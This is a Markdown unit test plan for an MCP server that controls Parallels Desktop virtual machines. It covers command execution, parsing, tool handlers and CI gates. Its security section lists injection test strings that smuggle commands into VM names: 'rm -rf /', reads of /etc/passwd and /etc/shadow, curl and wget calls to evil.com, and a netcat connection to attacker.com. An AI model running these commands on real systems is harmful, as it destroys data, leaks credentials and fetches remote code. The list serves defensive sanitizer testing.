# MCP Parallels Desktop Server - Comprehensive Unit Test Plan

## Overview

This document outlines a comprehensive unit test plan for the MCP Parallels Desktop server, targeting >90% code coverage and ensuring robust quality through Test-Driven Development (TDD) practices.

## Test Framework and Configuration

- **Framework**: Jest with TypeScript support
- **Coverage Target**: >90% for critical modules
- **Test Structure**: Unit tests in `src/__tests__/unit/`, Integration tests in `src/__tests__/integration/`
- **Mocking Strategy**: Mock external dependencies (child_process, file system operations)

## Module Test Plans

### 1. Command Execution Module (`prlctl-handler.ts`)

#### Test Coverage Areas

##### 1.1 `executePrlctl` Function

**Test Cases:**

- ✅ Successful command execution with stdout only
- ✅ Successful command execution with both stdout and stderr
- ✅ Command failure with error code
- ✅ Command timeout handling
- ✅ Large output buffer handling (>10MB)
- ✅ Empty command arguments validation
- ✅ Invalid command path handling
- ✅ Partial output on command failure
- ✅ Signal termination handling (SIGTERM, SIGKILL)

**Mock Requirements:**

```typescript
// Mock child_process.execFile
jest.mock('child_process', () => ({
  execFile: jest.fn((cmd, args, options, callback) => {
    // Mock implementation
  }),
}));
```

**Edge Cases:**

- Buffer overflow scenarios
- Unicode/special characters in output
- Concurrent command execution
- System resource exhaustion

##### 1.2 `parseVmList` Function

**Test Cases:**

- ✅ Empty VM list parsing
- ✅ Single VM with all fields
- ✅ Single VM without IP address
- ✅ Multiple VMs with mixed states
- ✅ Header line detection and skipping
- ✅ VMs with spaces in names
- ✅ VMs with special characters in names
- ✅ Malformed line handling
- ✅ Extra whitespace handling
- ✅ IPv6 address parsing
- ✅ Multiple network interfaces

**Test Data Examples:**

```typescript
const testCases = [
  {
    input: '{uuid} running 192.168.1.1 Test VM',
    expected: { uuid: '{uuid}', status: 'running', ipAddress: '192.168.1.1', name: 'Test VM' },
  },
  {
    input: '{uuid} stopped - VM with Spaces in Name',
    expected: {
      uuid: '{uuid}',
      status: 'stopped',
      ipAddress: undefined,
      name: 'VM with Spaces in Name',
    },
  },
];
```

##### 1.3 `parseSnapshotList` Function

**Test Cases:**

- ✅ Empty snapshot list
- ✅ Single snapshot parsing
- ✅ Current snapshot identification (\*)
- ✅ Multiple snapshots with hierarchy
- ✅ Snapshot names with quotes
- ✅ Snapshot names with special characters
- ✅ Date format variations
- ✅ Malformed snapshot entries
- ✅ Nested snapshot trees

##### 1.4 `sanitizeVmIdentifier` Function

**Test Cases:**

- ✅ Alphanumeric preservation
- ✅ UUID format preservation
- ✅ Hyphen and underscore preservation
- ✅ Shell metacharacter removal (;, |, &, $, `, etc.)
- ✅ Command injection prevention
- ✅ Path traversal prevention
- ✅ Empty string handling
- ✅ Unicode character handling
- ✅ Maximum length validation

**Security Test Vectors:**

```typescript
const injectionVectors = [
  'vm; rm -rf /',
  'vm`cat /etc/passwd`',
  'vm$(curl evil.com)',
  'vm && nc attacker.com 4444',
  'vm | base64 -d | sh',
  'vm\nwget http://evil.com/backdoor.sh',
  'vm${IFS}cat${IFS}/etc/shadow',
];
```

##### 1.5 `isValidUuid` Function

**Test Cases:**

- ✅ Valid UUID with correct format
- ✅ Case-insensitive UUID validation
- ✅ Missing braces rejection
- ✅ Invalid character rejection
- ✅ Incorrect length rejection
- ✅ Wrong separator rejection
- ✅ Empty string/null handling

### 2. Security Module (Implicit in prlctl-handler.ts)

#### Test Coverage Areas

##### 2.1 Input Sanitization

**Test Cases:**

- Command injection prevention via semicolons
- Command injection prevention via pipes
- Command injection prevention via command substitution
- Path traversal prevention (../, ..\)
- Null byte injection prevention
- Unicode normalization attacks
- Buffer overflow attempts
- XML/JSON injection in parameters

**Test Implementation:**

```typescript
describe('Security - Input Sanitization', () => {
  const dangerousInputs = [
    { input: '../../../etc/passwd', description: 'Path traversal' },
    { input: 'vm\x00.txt', description: 'Null byte injection' },
    { input: 'vm⁄etc⁄passwd', description: 'Unicode slash variants' },
  ];

  test.each(dangerousInputs)('should sanitize $description', ({ input }) => {
    const result = sanitizeVmIdentifier(input);
    expect(result).not.toContain('..');
    expect(result).not.toContain('\x00');
  });
});
```

##### 2.2 Command Construction Safety

**Test Cases:**

- Verify execFile usage (no shell interpretation)
- Argument array validation
- Environment variable isolation
- Working directory restrictions
- Resource limit enforcement

### 3. Tool Handler Modules

#### Common Test Pattern for All Tools

Each tool handler should have:

##### 3.1 Input Validation Tests

- Schema validation with valid inputs
- Schema rejection with invalid inputs
- Required field validation
- Optional field handling
- Type coercion testing
- Boundary value testing

##### 3.2 Error Handling Tests

- Command execution failures
- Invalid VM identifiers
- Non-existent VMs
- Permission denied scenarios
- Network failures
- Timeout scenarios

##### 3.3 Response Formatting Tests

- Success response structure
- Error response structure
- Content type validation
- Markdown formatting verification

#### Tool-Specific Test Cases

##### 3.3.1 `listVMs` Tool

**Test Cases:**

- Empty VM list response
- Single VM response formatting
- Multiple VMs response formatting
- Error handling for prlctl failure
- Stderr warning handling

##### 3.3.2 `createVM` Tool

**Test Cases:**

- Create from scratch with minimal params
- Create from scratch with all params
- Clone from template
- Invalid VM name validation
- Memory limits validation (512-32768 MB)
- CPU limits validation (1-16)
- Disk size limits validation (8-2048 GB)
- Hardware configuration after creation
- Duplicate VM name handling

**Mock Scenarios:**

```typescript
const createVmMocks = {
  successCreate: { stdout: 'VM created successfully', stderr: '' },
  duplicateName: { stdout: '', stderr: 'VM with this name already exists' },
  templateNotFound: { stdout: '', stderr: 'Template VM not found' },
};
```

##### 3.3.3 `startVM` Tool

**Test Cases:**

- Start stopped VM
- Start already running VM
- Start non-existent VM
- Start suspended VM
- Permission denied scenario

##### 3.3.4 `stopVM` Tool

**Test Cases:**

- Graceful stop
- Force stop (kill)
- Stop already stopped VM
- Stop non-existent VM
- Timeout during graceful stop

##### 3.3.5 `deleteVM` Tool

**Test Cases:**

- Delete with confirmation=true
- Delete without confirmation (should fail)
- Delete running VM
- Delete non-existent VM
- Delete VM with snapshots

##### 3.3.6 `takeSnapshot` Tool

**Test Cases:**

- Create snapshot with name only
- Create snapshot with description
- Duplicate snapshot name handling
- Snapshot of running VM
- Snapshot of stopped VM
- Maximum snapshot limit

##### 3.3.7 `restoreSnapshot` Tool

**Test Cases:**

- Restore to existing snapshot
- Restore to non-existent snapshot
- Restore running VM (should fail/warn)
- Restore with current snapshot

##### 3.3.8 `listSnapshots` Tool

**Test Cases:**

- List with no snapshots
- List with single snapshot
- List with snapshot tree
- Current snapshot identification

##### 3.3.9 `takeScreenshot` Tool

**Test Cases:**

- Screenshot of running VM
- Screenshot of stopped VM (should fail)
- Custom output path
- Default output path
- Invalid output path
- Permission denied for output path

##### 3.3.10 `createTerminalSession` Tool

**Test Cases:**

- Session with default user
- Session with specified user
- VM without network
- SSH not configured

##### 3.3.11 `manageSshAuth` Tool

**Test Cases:**

- Configure with public key path
- Configure without public key (generate)
- Enable passwordless sudo
- Invalid username
- Invalid public key path

##### 3.3.12 `batchOperation` Tool

**Test Cases:**

- Batch start multiple VMs
- Batch stop with force flag
- Mixed VM states
- Partial failure handling
- Empty VM list
- Invalid operation type

### 4. Integration Test Requirements

#### 4.1 MCP Server Integration

**Test Cases:**

- Tool registration verification
- Request/response protocol compliance
- Error response format compliance
- Concurrent request handling

#### 4.2 End-to-End Workflows

**Test Cases:**

- Create VM → Start → Take Snapshot → Stop → Delete
- Clone Template → Configure → Start → Terminal Session
- Batch operations on multiple VMs
- Error recovery scenarios

### 5. Test Data and Fixtures

#### Required Test Fixtures

```typescript
// Mock VM data
export const mockVMs = {
  running: { uuid: '{123...}', name: 'TestVM1', status: 'running', ipAddress: '192.168.1.100' },
  stopped: { uuid: '{456...}', name: 'TestVM2', status: 'stopped' },
  suspended: { uuid: '{789...}', name: 'TestVM3', status: 'suspended' },
};

// Mock snapshot data
export const mockSnapshots = {
  current: { id: '{snap1}', name: 'Current State', current: true, date: '2024-01-15' },
  previous: { id: '{snap2}', name: 'Before Update', current: false, date: '2024-01-14' },
};

// Mock command outputs
export const mockOutputs = {
  vmList: 'UUID STATUS IP_ADDR NAME\n{123...} running 192.168.1.100 TestVM1',
  snapshotList: '{snap1} * "Current State" 2024-01-15\n{snap2} "Before Update" 2024-01-14',
};
```

### 6. Coverage Targets and Metrics

#### Module Coverage Targets

- `prlctl-handler.ts`: >95% coverage
- Tool handlers: >90% coverage each
- Security functions: 100% coverage
- Utility functions: >95% coverage

#### Quality Metrics

- **Mutation Score**: >85% (using Stryker)
- **Cyclomatic Complexity**: <10 per function
- **Test Execution Time**: <5s for unit tests
- **Flaky Test Rate**: 0%

### 7. CI/CD Integration

#### Test Pipeline Configuration

```yaml
test:
  - stage: lint
    script: npm run lint
  - stage: unit-tests
    script: npm run test:unit -- --coverage
    coverage: /Lines\s*:\s*(\d+\.\d+)%/
  - stage: integration-tests
    script: npm run test:integration
  - stage: security-scan
    script: npm audit && npm run test:security
  - stage: mutation-tests
    script: npm run test:mutation
```

#### Quality Gates

- Minimum coverage: 90%
- Zero high/critical vulnerabilities
- All tests must pass
- No new lint errors

### 8. Test Implementation Priority

1. **Phase 1 - Critical Security**
   - Input sanitization tests
   - Command injection prevention
   - Path traversal prevention

2. **Phase 2 - Core Functionality**
   - executePrlctl tests
   - Parsing function tests
   - Basic tool handler tests

3. **Phase 3 - Complete Coverage**
   - All tool handlers
   - Edge cases
   - Error scenarios

4. **Phase 4 - Integration**
   - End-to-end workflows
   - Performance tests
   - Stress tests

### 9. Test Maintenance Guidelines

- Update tests before modifying code (TDD)
- Add regression tests for all bug fixes
- Review and update test data quarterly
- Monitor test execution times
- Refactor tests to reduce duplication
- Document complex test scenarios

### 10. Security Test Checklist

For each module/function that handles user input:

- [ ] Command injection tests
- [ ] Path traversal tests
- [ ] Buffer overflow tests
- [ ] Input validation boundary tests
- [ ] Error message information disclosure
- [ ] Resource exhaustion tests
- [ ] Concurrent access tests
- [ ] Permission bypass attempts
